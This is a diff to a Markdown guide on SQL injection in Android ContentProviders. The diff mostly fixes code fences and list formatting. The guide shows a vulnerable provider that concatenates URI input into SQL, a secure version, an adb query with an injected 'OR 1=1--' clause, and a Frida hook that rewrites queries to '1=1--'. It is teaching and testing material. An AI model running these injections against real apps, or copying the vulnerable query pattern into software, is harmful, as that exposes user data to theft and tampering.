@@ -68,6 +68,7 @@ is prone to SQL Injection:
     android:authorities="com.example.vulnerable.provider"
     android:exported="true">
 </provider>
+```
 
 ```java
 @Override
@@ -90,12 +91,13 @@ public Cursor query(Uri uri, String[] projection, String selection, String[] sel
 
     return qb.query(db, projection, selection, selectionArgs, null, null, sortOrder);
 }
+```
 
 #### **Why is this code vulnerable?**
 
--It concatenates user input (uri.getPathSegments().get(1)) directly into an SQL query.
--An attacker can inject malicious SQL code via the URI path, leading to SQL Injection attacks.
--If exploited, an attacker can steal, modify, or delete data from the database.
+- It concatenates user input (uri.getPathSegments().get(1)) directly into an SQL query.
+- An attacker can inject malicious SQL code via the URI path, leading to SQL Injection attacks.
+- If exploited, an attacker can steal, modify, or delete data from the database.
 
 #### **Secure Implementation**
 
@@ -121,6 +123,7 @@ public Cursor query(Uri uri, String[] projection, String selection, String selec
 
     return qb.query(db, projection, selection, selectionArgs, null, null, sortOrder);
 }
+```
 
 ## Dynamic Analysis
 
@@ -131,32 +134,41 @@ a running application.
 
 ---
 
-### ** Testing for SQL Injection using `adb shell`**
+### **Testing for SQL Injection using `adb shell`**
 If an Android application exposes a vulnerable `ContentProvider`,  
 an attacker can **query it manually** from the command line.
 
-#### ** Step 1: Check for Exposed Content Providers**
+#### **Step 1: Check for Exposed Content Providers**
 Run the following command to list exported ContentProviders:
+
 ```bash
 adb shell content providers
+```
 
-#### ** Step 2: Query the ContentProvider for Student Data**
+#### **Step 2: Query the ContentProvider for Student Data**
+
 ```bash
 adb shell content query --uri content://com.example.vulnerable.provider/students
+```
 
-#### ** Step 3: Attempt SQL Injection**
+#### **Step 3: Attempt SQL Injection**
+
 ```bash
 adb shell content query --uri content://com.example.vulnerable.provider/students --where "name='Bob' OR 1=1--"
+```
 
-### ** Exploiting SQL Injection using Frida**
+### **Exploiting SQL Injection using Frida**
 Frida is a powerful tool for **runtime manipulation of Android apps**.  
 We can use it to **hook and modify** database queries.
 
-#### ** Step 1: Attach to the Target Application**
+#### **Step 1: Attach to the Target Application**
+
 ```bash
 frida -U -n com.example.vulnerable.app -e "console.log('Frida attached!')"
+```
 
-#### ** Step 2: Intercept and Modify the Query**
+#### **Step 2: Intercept and Modify the Query**
+
 ```javascript
 Java.perform(function() {
     var ContentProvider = Java.use("com.example.vulnerable.VulnerableContentProvider");
@@ -165,3 +177,5 @@ Java.perform(function() {
         return this.query(uri, projection, "1=1--", selectionArgs, sortOrder);
     };
 });
+```
+
